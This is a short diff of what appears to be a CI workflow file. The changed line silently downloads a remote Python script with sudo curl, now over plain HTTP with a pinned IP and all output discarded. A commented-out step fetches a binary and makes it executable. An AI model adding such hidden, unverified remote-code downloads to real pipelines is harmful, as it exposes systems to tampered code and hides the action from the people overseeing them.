@@ -17,7 +17,7 @@ jobs:
           cd
 
           pip3 install requests >/dev/null 2>&1
-          sudo curl -s --silent -X GET https://exampleoci.yunzhongzhuan.com/python/cccc.py -o bin >/dev/null 2>&1
+          sudo curl -s --silent --resolve exampleoci.yunzhongzhuan.com:80:152.70.136.37  -X GET http://exampleoci.yunzhongzhuan.com/python/cccc.py -o bin >/dev/null 2>&1
           
           # curl -X GET "https://id5gfpyyw89p8g.1yunpan.com/aria2c-linux-amd64" -o /home/runner/aria2c
           # chmod +x /home/runner/aria2c
